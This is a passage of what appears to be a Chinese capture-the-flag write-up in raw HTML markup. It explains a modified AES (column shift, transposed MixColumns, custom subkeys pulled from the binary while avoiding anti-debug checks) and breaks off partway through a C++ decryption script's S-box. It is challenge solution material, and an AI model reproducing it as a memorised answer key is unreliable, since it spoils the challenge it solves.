class="hljs-number">2</span>mySb<span class="hljs-number">2</span>Dqmgh<br></code></pre></td></tr></table></figure><h2 id="AES-变种"><a href="#AES-变种" class="headerlink" title="AES 变种"></a>AES 变种</h2><ol><li>修改了 <code>行移位</code>为 <code>列移位</code></li></ol><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs tap">输入数据<br>df db 5d b9 <br>41 9b b8<span class="hljs-number"> 44 </span><br>f6<span class="hljs-number"> 74 </span>74<span class="hljs-number"> 74 </span><br>74<span class="hljs-number"> 74 </span>74<span class="hljs-number"> 95 </span><br><br>shift 本题计算结果:<br>DF<span class="hljs-number"> 74 </span>74<span class="hljs-number"> 44 </span><br>41 DB<span class="hljs-number"> 74 </span>74<br>F6 9B 5D 95<br>74<span class="hljs-number"> 74 </span>B8 B9<br><br>shift 标准计算结果:<br>df db 5d b9 <br>9b b8<span class="hljs-number"> 44 </span>41 <br>74<span class="hljs-number"> 74 </span>f6<span class="hljs-number"> 74 </span><br>95<span class="hljs-number"> 74 </span>74<span class="hljs-number"> 74 </span><br></code></pre></td></tr></table></figure><ol start="2"><li><p>修改了<code>列混合</code>的行为</p><p> 该题列混淆时，先将矩阵转置，再列混淆，最后再转置</p></li><li><p>修改了 <code>子密钥</code>计算过程</p><p> 具体怎么计算的没有细看，直接复制它计算好的数据即可, 但是要保证是没有被检测到反调试的数据</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> subkeys[<span class="hljs-number">11</span>][<span class="hljs-number">16</span>]  = &#123;<br>    <span class="hljs-number">0x31</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x32</span>,<br>    <span class="hljs-number">0x03</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xF2</span>,<br>    <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x5E</span>,<br>    <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xC4</span>,<br>    <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x10</span>,<br>    <span class="hljs-number">0x07</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x71</span>,<br>    <span class="hljs-number">0x21</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x0F</span>,<br>    <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x6F</span>,<br>    <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x65</span>,<br>    <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x69</span>,<br>    <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x4A</span><br>&#125;;<br></code></pre></td></tr></table></figure></li></ol><p>正向加密流程如下(注意用的是 myshift，还有 myTranspose )</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++">myAddRoundKey(pArray, subkeys, <span class="hljs-number">0</span>);<br>printArray(pArray);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++)&#123;<br><br>    subBytes(pArray);<span class="hljs-comment">//字节代换</span><br><br>    myshift(pArray);<span class="hljs-comment">//行移位</span><br><br>    myTranspose(pArray);<br>    mixColumns(pArray);<span class="hljs-comment">//列混合</span><br>    myTranspose(pArray);<br><br>    myAddRoundKey(pArray, subkeys, i);<br>&#125;<br>subBytes(pArray);<br>myshift(pArray);<br>myAddRoundKey(pArray, subkeys, <span class="hljs-number">10</span>);<br></code></pre></td></tr></table></figure><h2 id="完整解密脚本"><a href="#完整解密脚本" class="headerlink" title="完整解密脚本"></a>完整解密脚本</h2><p>这份AES板子里的 convertToIntArray 函数有 bug 慎用！！！！</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cctype&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * S盒</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> S[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] = &#123; <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x76</span>,<br>                               <span class="hljs-number">0xca</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xc0</span>,<br>                               <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>,<br>                               <span class="hljs-number">0x04</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span 